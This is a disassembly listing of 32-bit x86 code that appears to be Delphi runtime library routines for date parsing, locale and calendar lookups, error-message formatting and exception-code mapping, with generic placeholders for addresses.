mov eax [ eax - 0x4 ]
cdq
xor eax edx
sub eax edx
add ecx eax
mov eax ecx
mov ecx 0x64
cdq
idiv ecx
imul eax eax 0x64
add ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
neg [ eax - 0x4 ]
jmp r-xdata
sub_3a6c490
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_3a6c7b2
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
mov [ ebp - 0x16 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0xd ] 0x0
mov eax [ rw-data ]
call sub_3a6c34c
mov [ ebp - 0xe ] al
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x67
jne r-xdata
mov edx [ rw-data ]
mov eax r-xdata
call sub_3a6e0bc
test eax eax
jle r-xdata
mov edx ebx
mov eax esi
call sub_3a6c398
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx ]
dec ecx
mov edx 0x1
mov eax esi
call sub_3a65798
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x8 ]
call sub_3a69588
mov eax [ ebp - 0x8 ]
call sub_3a6c3e0
mov [ ebp - 0x4 ] eax
jmp r-xdata
lea eax [ ebp - 0x19 ]
push eax
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_3a6c1a4
test al al
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a6c7b9
lea eax [ ebp - 0x28 ]
mov edx 0x3
call sub_3a652c4
lea eax [ ebp - 0x8 ]
call sub_3a652a0
retn
mov edx ebx
movzx ecx [ rw-data ]
mov eax esi
call sub_3a6c310
test al al
je r-xdata
lea eax [ ebp - 0x1a ]
push eax
lea ecx [ ebp - 0x12 ]
mov edx ebx
mov eax esi
call sub_3a6c1a4
test al al
je r-xdata
mov edx ebx
movzx ecx [ rw-data ]
mov eax esi
call sub_3a6c310
test al al
je r-xdata
call sub_3a6b574
mov edi eax
cmp [ ebp - 0xe ] 0x1
jne r-xdata
lea eax [ ebp - 0x1b ]
push eax
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax esi
call sub_3a6c1a4
test al al
je r-xdata
movzx eax [ ebp - 0x10 ]
mov [ ebp - 0x16 ] ax
movzx eax [ ebp - 0x12 ]
mov [ ebp - 0x18 ] ax
movzx eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] ax
movzx eax [ ebp - 0x12 ]
mov [ ebp - 0x16 ] ax
jmp r-xdata
movzx eax [ ebp - 0xe ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0xc ]
push eax
movzx ecx [ ebp - 0x18 ]
movzx edx [ ebp - 0x16 ]
mov eax edi
call sub_3a6b214
mov [ ebp - 0xd ] al
mov edx [ rw-data ]
mov eax r-xdata
call sub_3a6587c
test eax eax
je r-xdata
mov edx ebx
movzx ecx [ rw-data ]
mov eax esi
call sub_3a6c310
mov edx ebx
mov eax esi
call sub_3a6c180
cmp [ rw-data ] 0x0
je r-xdata
movzx edi [ ebp - 0x14 ]
movzx eax [ ebp - 0x1b ]
mov [ ebp - 0x1c ] al
movzx eax [ ebp - 0x10 ]
mov [ ebp - 0x16 ] ax
movzx eax [ ebp - 0x12 ]
mov [ ebp - 0x18 ] ax
jmp r-xdata
je r-xdata
mov eax [ rw-data ]
movzx eax [ eax ]
add al 0xd0
sub al 0xa
jae r-xdata
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
movzx edi [ ebp - 0x14 ]
movzx eax [ ebp - 0x1b ]
mov [ ebp - 0x1c ] al
movzx eax [ ebp - 0x12 ]
mov [ ebp - 0x16 ] ax
movzx eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] ax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_3a65560
cmp eax [ ebx ]
jl r-xdata
mov edx ebx
mov eax esi
call sub_3a6c398
jmp r-xdata
cmp [ ebp - 0x1c ] 0x2
ja r-xdata
push ebp
movzx eax di
call sub_3a6c434
pop ecx
mov edi eax
jmp r-xdata
movzx edi [ ebp - 0x10 ]
movzx eax [ ebp - 0x19 ]
mov [ ebp - 0x1c ] al
movzx eax [ ebp - 0x12 ]
mov [ ebp - 0x16 ] ax
movzx eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] ax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_3a6c180
mov eax esi
call sub_3a65560
cmp eax [ ebx ]
jl r-xdata
mov eax [ ebx ]
cmp [ esi + eax - 0x1 ] 0x20
jne r-xdata
call sub_3a6b574
movzx ecx ax
movzx eax [ rw-data ]
sub ecx eax
mov eax ecx
push ecx
mov ecx 0x64
cdq
idiv ecx
pop ecx
imul ax ax 0x64
add di ax
cmp [ rw-data ] 0x0
jbe r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ rw-data ]
call sub_3a65560
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_3a65798
mov edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_3a69524
test eax eax
je r-xdata
inc [ ebx ]
movzx eax di
cmp ecx eax
jle r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
call sub_3a65560
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_3a65798
mov edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_3a69524
test eax eax
jne r-xdata
add di 0x64
jmp r-xdata
sub_3a6c7dc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov esi edx
mov ebp eax
xor ebx ebx
or edi 0xffffffff
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_3a6c238
test al al
jne r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_3a6c238
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_3a6c238
test al al
jne r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax ebp
call sub_3a6c1a4
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_3a6c180
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_3a6c238
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x6 ] 0x0
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xa ] 0x0
mov edx esi
movzx ecx [ rw-data ]
mov eax ebp
call sub_3a6c310
test al al
je r-xdata
test edi edi
jge r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xa ]
mov edx esi
mov eax ebp
call sub_3a6c1a4
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_3a6c238
test al al
jne r-xdata
mov edx esi
movzx ecx [ rw-data ]
mov eax ebp
call sub_3a6c310
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_3a6c180
movzx eax [ esp + 0xa ]
push eax
mov eax [ esp + 0x4 ]
push eax
movzx ecx [ esp + 0x10 ]
movzx edx [ esp + 0xe ]
movzx eax [ esp + 0xc ]
call sub_3a6b0cc
mov ebx eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_3a6c238
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xc ]
mov edx esi
mov eax ebp
call sub_3a6c1a4
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
ja r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_3a6c238
test al al
jne r-xdata
mov edx esi
movzx ecx [ rw-data ]
mov eax ebp
call sub_3a6c310
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
jne r-xdata
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_3a6c238
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xe ]
mov edx esi
mov eax ebp
call sub_3a6c1a4
test al al
je r-xdata
add [ esp + 0x4 ] di
mov [ esp + 0x4 ] 0x0
sub_3a6c9d4
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_3a6c490
test al al
je r-xdata
xor eax eax
mov eax ebx
test eax eax
je r-xdata
cmp eax [ esp ]
setl al
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
pop edx
pop esi
pop ebx
retn
sub_3a6ca0c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_3a6c7dc
test al al
je r-xdata
xor eax eax
mov eax ebx
test eax eax
je r-xdata
cmp eax [ esp ]
setl al
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
pop edx
pop esi
pop ebx
retn
sub_3a6ca44
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x1
xor eax eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax esi
call sub_3a6c490
test al al
jne r-xdata
mov eax esi
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
cmp eax [ esp ]
jge r-xdata
sub eax 0x4
mov eax [ eax ]
test al al
je r-xdata
lea ecx [ esp + 0x10 ]
mov edx esp
mov eax esi
call sub_3a6c7dc
mov al 0x1
jmp r-xdata
fld [ esp + 0x8 ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
jb r-xdata
mov edx edi
mov eax esi
call sub_3a6ca0c
mov ebx eax
jmp r-xdata
xor al 0x1
fld [ esp + 0x8 ]
fsub [ esp + 0x10 ]
fstp [ edi ]
fwait
fld [ esp + 0x8 ]
fadd [ esp + 0x10 ]
fstp [ edi ]
fwait
jmp r-xdata
mov eax ebx
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_3a6cae0
push ebx
add esp 0xffffff00
mov ebx edx
push 0x0
push 0x100
lea edx [ esp + 0x8 ]
push edx
push 0x0
push eax
push 0x0
push 0x3200
call FormatMessageA
jmp r-xdata
test eax eax
jle r-xdata
mov edx esp
mov ecx ebx
xchg ecx eax
call sub_3a65390
add esp 0x100
pop ebx
retn
movzx edx [ esp + eax - 0x1 ]
sub dl 0x21
jb r-xdata
dec eax
sub dl 0xd
je r-xdata
sub_3a6cb2c
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov esi ecx
mov ebx [ ebp + 0x8 ]
push 0x100
lea ecx [ ebp - 0x100 ]
push ecx
push edx
push eax
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov edx esi
call sub_3a652f4
mov ecx eax
dec ecx
lea edx [ ebp - 0x100 ]
mov eax ebx
call sub_3a65390
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_3a6cb78
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov esi edx
mov edi eax
push 0x2
lea eax [ esp + 0x4 ]
push eax
push esi
push edi
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
movzx eax [ esp ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_3a6cba4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push ebx
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx esi
call sub_3a6cb2c
cmp [ ebx ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx ebx
call sub_3a67194
sub_3a6cbe0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_3a6ccf3
push [ fs : eax ]
mov [ fs : eax ] esp
call GetThreadLocale
mov [ ebp - 0x4 ] eax
mov ebx 0x1
mov esi rw-data
mov edi rw-data
push ebp
push 0xb
lea eax [ ebp - 0xc ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x44 ]
dec eax
call sub_3a6cba4
pop ecx
mov edx [ ebp - 0xc ]
mov eax esi
call sub_3a652f4
push ebp
push 0xb
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x38 ]
dec eax
call sub_3a6cba4
pop ecx
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_3a652f4
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0xd
jne r-xdata
mov ebx 0x1
mov esi rw-data
mov edi rw-data
lea eax [ ebx + 0x5 ]
mov ecx 0x7
cdq
idiv ecx
mov [ ebp - 0x8 ] edx
push ebp
push 0x6
lea eax [ ebp - 0x14 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x31
call sub_3a6cba4
pop ecx
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_3a652f4
push ebp
push 0x6
lea eax [ ebp - 0x18 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x2a
call sub_3a6cba4
pop ecx
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_3a652f4
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0x8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a6ccfa
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_3a652c4
retn
sub_3a6cd04
push ebp
mov ebp esp
push ebx
push esi
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0x0
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebx * 4 + rw-data ]
mov edx [ ebp + 0x8 ]
call sub_3a65498
mov esi 0x1
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
inc ebx
sub_3a6cd40
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_3a6cda5
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0xffffffff
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_3a65498
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_3a69a14
mov [ ebx * 4 + rw-data ] eax
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a6cdac
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
inc ebx
sub_3a6cdb8
push ebp
mov ebp esp
push 0x0
push esi
xor eax eax
push ebp
push sub_3a6ce4f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x100b
call sub_3a6cb2c
mov eax [ ebp - 0x4 ]
mov edx 0x1
call sub_3a69a14
mov esi eax
mov eax esi
add eax 0xfffffffd
sub eax 0x3
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a6ce56
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
push 0x4
push esi
call GetThreadLocale
push eax
push sub_3a6cd04
call EnumCalendarInfoA
mov edx 0x7
mov eax rw-data
mov [ eax ] 0xffffffff
add eax 0x4
dec edx
jne r-xdata
push 0x3
push esi
call GetThreadLocale
push eax
push sub_3a6cd40
call EnumCalendarInfoA
sub_3a6ce68
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_3a6d038
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x1
mov eax edi
call sub_3a652a0
lea eax [ ebp - 0x8 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x1009
call sub_3a6cb2c
mov eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a69a14
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
mov eax esi
call sub_3a65560
cmp ebx eax
jle r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
movzx eax [ esi + ebx - 0x1 ]
movzx eax al
bt [ rw-data ] eax
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a6d03f
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_3a652c4
retn
mov al 0x1
add eax 0xfffffff3
sub eax 0x2
jb r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_3a6a2b4
test eax eax
jne r-xdata
mov edx ebx
mov eax esi
call sub_3a6dfa8
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
call sub_3a65798
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_3a6556c
add ebx [ ebp - 0x4 ]
jmp r-xdata
mov eax edi
mov edx esi
call sub_3a652f4
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x4
call sub_3a6a2b4
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_3a6556c
inc ebx
jmp r-xdata
mov eax esi
call sub_3a65560
cmp ebx eax
jle r-xdata
test al al
je r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_3a6a2b4
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_3a6556c
add ebx 0x3
jmp r-xdata
inc ebx
movzx eax [ esi + ebx - 0x1 ]
sub al 0x47
je r-xdata
jmp r-xdata
movzx eax [ esi + ebx - 0x1 ]
sub al 0x59
je r-xdata
mov eax edi
mov edx r-xdata
call sub_3a6556c
inc ebx
jmp r-xdata
inc ebx
sub al 0x20
je r-xdata
mov eax edi
mov edx r-xdata
call sub_3a6556c
jmp r-xdata
sub al 0x20
jne r-xdata
lea eax [ ebp - 0xc ]
movzx edx [ esi + ebx - 0x1 ]
call sub_3a65488
mov edx [ ebp - 0xc ]
mov eax edi
call sub_3a6556c
lea eax [ ebp - 0x14 ]
movzx edx [ esi + ebx - 0x1 ]
call sub_3a65488
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_3a6556c
sub_3a6d0a4
push ebp
mov ebp esp
add esp 0xfffffba8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
push 0x1c
lea eax [ ebp - 0x330 ]
push eax
push ebx
call VirtualQuery
cmp [ ebp - 0x320 ] 0x1000
jne r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ rw-data ]
push eax
call GetModuleFileNameA
mov eax ebx
call sub_3a6d098
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ ebp - 0x32c ]
push eax
call GetModuleFileNameA
test eax eax
jne r-xdata
lea eax [ ebp - 0x212 ]
mov dl 0x5c
call sub_3a6e228
mov edx eax
inc edx
lea eax [ ebp - 0x10d ]
mov ecx 0x104
call sub_3a6a1ac
mov ebx r-xdata
mov edi r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
sub ebx [ ebp - 0x32c ]
mov [ ebp - 0x8 ] ebx
push 0x100
lea eax [ ebp - 0x312 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_3a666b8
push eax
call LoadStringA
lea edx [ ebp - 0x458 ]
mov eax [ esi ]
call sub_3a64260
lea eax [ ebp - 0x458 ]
mov [ ebp - 0x358 ] eax
mov [ ebp - 0x354 ] 0x4
lea eax [ ebp - 0x10d ]
mov [ ebp - 0x350 ] eax
mov [ ebp - 0x34c ] 0x6
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x348 ] eax
mov [ ebp - 0x344 ] 0x5
mov [ ebp - 0x340 ] ebx
mov [ ebp - 0x33c ] 0x6
mov [ ebp - 0x338 ] edi
mov [ ebp - 0x334 ] 0x6
lea eax [ ebp - 0x358 ]
push eax
push 0x4
lea ecx [ ebp - 0x312 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_3a6a810
mov eax [ ebp - 0x4 ]
call sub_3a6a120
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x4 ]
call sub_3a65730
mov ebx eax
mov eax ebx
call sub_3a6a120
test eax eax
je r-xdata
cmp [ ebx + eax - 0x1 ] 0x2e
je r-xdata
mov edi r-xdata
sub_3a6d22c
add esp 0xfffffbbc
push 0x400
lea ecx [ esp + 0x48 ]
call sub_3a6d0a4
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x40
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_3a666b8
push eax
call LoadStringA
push 0x2010
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x4c ]
push eax
push 0x0
call MessageBoxA
mov eax [ rw-data ]
call sub_3a637dc
call sub_3a6303c
lea eax [ esp + 0x44 ]
push eax
lea eax [ esp + 0x48 ]
push eax
call CharToOemA
push 0x0
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4c ]
call sub_3a6a120
push eax
lea eax [ esp + 0x50 ]
push eax
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
jmp r-xdata
add esp 0x444
retn
sub_3a6d318
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_3a652f4
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a6d354
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_3a6d3ae
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_3a6a850
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_3a652f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a6d3b5
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
add esp 0xfffffff0
call sub_3a646e4
sub_3a6d3b5
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a6d3d4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea edx [ edi + 0x4 ]
mov eax esi
call sub_3a67194
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a6d410
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_3a6d47c
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_3a67194
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_3a6a850
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_3a652f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a6d483
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_3a652c4
retn
add esp 0xfffffff0
call sub_3a646e4
sub_3a6d483
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a6d4a4
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_3a652f4
mov eax [ ebp + 0x8 ]
mov [ edi + 0x8 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a6d518
push ebx
push esi
add esp 0xfffffff8
xor ebx ebx
call sub_3a63134
mov esi eax
jmp r-xdata
cmp ebx 0x6
jg r-xdata
cmp ebx 0x6
jg r-xdata
cmp esi [ ebx * 8 + rw-data ]
jne r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d410
mov ecx [ ebx * 8 + rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d318
jmp r-xdata
inc ebx
mov [ eax + 0xc ] esi
pop ecx
pop edx
pop esi
pop ebx
retn
sub_3a6d57a
cmpsb [ esi ] [ edi ]
add ecx [ esi ]
or dl [ ebp + eax * 2 + 0x78 ]
arpl [ ebp + 0x70 ] sp
je r-xdata
cmp al 0xff
arpl [ gs : eax ] cx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x403a6 ] dl
add [ eax ] al
push ebx
mov ebx edx
mov edx eax
dec dl
je r-xdata
mov edx [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
push ebx
mov eax edx
jmp sub_3a64c34
mov edx [ rw-data ]
jmp r-xdata
dec edx
sub dl 0x16
jb r-xdata
movzx eax al
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_3a6d318
mov edx eax
jmp r-xdata
jmp r-xdata
call sub_3a6d518
mov edx eax
sub_3a6d5e8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3a6d684
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_3a67194
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_3a65338
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d354
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a6d68b
lea eax [ ebp - 0x20 ]
call sub_3a652a0
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3a6d6d8
mov eax [ eax ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0x6
retn
cmp eax 0xc000008e
jg r-xdata
mov al 0xe
retn
sub eax 0x3d
je r-xdata
mov al 0xc
retn
sub eax 0xc0000093
je r-xdata
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd
retn
jmp r-xdata
mov al 0x9
retn
dec eax
je r-xdata
je r-xdata
mov al 0x7
retn
sub eax 0xc0000005
je r-xdata
mov al 0x16
retn
mov al 0x3
retn
dec eax
je r-xdata
mov al 0x8
retn
jmp r-xdata
mov al 0xb
retn
sub eax 0x87
je r-xdata
mov al 0x5
retn
jmp r-xdata
mov al 0x4
retn
dec eax
je r-xdata
jmp r-xdata
sub_3a6d770
push ebp
mov ebp esp
add esp 0xfffffe90
push ebx
push esi
xor eax eax
mov [ ebp - 0x170 ] eax
mov [ ebp - 0x14c ] eax
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x150 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3a6d92b
push [ fs : eax ]
